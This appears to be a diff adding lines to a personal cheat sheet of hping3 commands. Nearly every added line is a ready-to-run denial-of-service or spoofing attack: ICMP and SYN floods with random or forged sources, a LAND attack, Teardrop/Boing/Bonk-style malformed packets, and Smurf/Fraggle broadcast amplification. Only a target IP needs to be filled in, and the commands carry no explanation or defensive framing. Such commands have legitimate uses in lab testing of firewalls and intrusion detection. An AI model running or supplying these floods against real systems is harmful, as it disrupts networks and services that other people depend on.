@@ -29,3 +29,40 @@ hping3 192.168.11.10 -a 0.0.0.1 -f
 
 SYN fragments
 hping3 192.168.11.10 -a 0.0.0.1 -S -f (fragments)
+
+ACK:
+hping3 IP -A -c 5 -p 80
+
+
+
+SYN:
+hping3 IP -S -c 5 -p 80
+
+
+Syn/ACK:
+hping3 IP -SA -c 5 -p 80
+
+
+ICMP flooding:
+hping3 --icmp IP -d 65000
+
+
+ICMP flooding with 0.0.0.1 like source
+hping3 IP -1 -a 0.0.0.1 -d 60000
+
+
+
+SYN flooding:
+hping3 --rand-source IP -p 80 -S
+
+
+LAND attack
+hping3 IP -a IP --icmp --flood
+
+
+Boing,Bonk, Teardrop
+hping3 IP -a 1.1.1.1 --id 3200 -M 34340 -p 21 -d 320
+
+Smurf,Fraggle
+hping3 192.168.11.255 -a IP --icmp
+-thats broadcast
